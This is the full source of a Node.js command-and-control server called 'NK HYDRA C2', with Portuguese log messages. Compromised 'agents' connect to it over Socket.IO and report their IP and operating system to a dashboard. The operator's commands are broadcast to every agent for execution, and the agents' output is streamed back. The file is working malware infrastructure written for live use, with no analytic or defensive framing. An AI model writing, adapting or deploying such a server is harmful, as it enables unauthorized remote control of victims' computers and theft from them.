/* NK HYDRA C2 SERVER v36.0 */
/* SINGULARITY HIVE PROTOCOL */
/* FIX: HIGH TIMEOUTS FOR RENDER STABILITY */

const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const cors = require('cors');

const app = express();
app.use(cors());

app.get('/', (req, res) => res.send('NK C2 v36 - TUDO 3 ONLINE'));

const server = http.createServer(app);
const io = new Server(server, { 
    cors: { origin: "*" },
    // Increase timeout to avoid transport errors on Render
    pingTimeout: 60000, 
    pingInterval: 25000,
    transports: ['websocket', 'polling'] 
}); 

console.log("[*] SERVIDOR INICIADO. AGUARDANDO OS MENOR (AGENTS)...");

io.on('connection', (socket) => {
    console.log(`[+] NOVA CONEXAO: ${socket.id}`);
    
    socket.on('identify', (data) => {
        if (data.type === 'agent') {
            const agentId = data.id || socket.id;
            console.log(`[AGENT NA LINHA] ${agentId}`);
            
            // Broadcast to Dashboard
            io.emit('status', { 
                agents: [{ 
                    id: agentId, 
                    ip: socket.handshake.address.replace('::ffff:', ''), 
                    os: data.os || 'UNKNOWN', 
                    status: 'ONLINE' 
                }] 
            });
            
            io.emit('log', `[SYSTEM] AGENT CONNECTED: ${agentId}`);
        }
    });

    socket.on('cmd', (data) => {
        console.log(`[CMD] ${data.cmd} -> ${data.target}`);
        io.emit('exec', data); // Broadcast to all agents
        io.emit('log', `[C2] ENVIANDO ORDEM: ${data.cmd}`);
    });

    socket.on('stream_log', (data) => {
        console.log(`[LOG] ${data.output}`);
        io.emit('log', data);
    });
});

server.listen(process.env.PORT || 3000);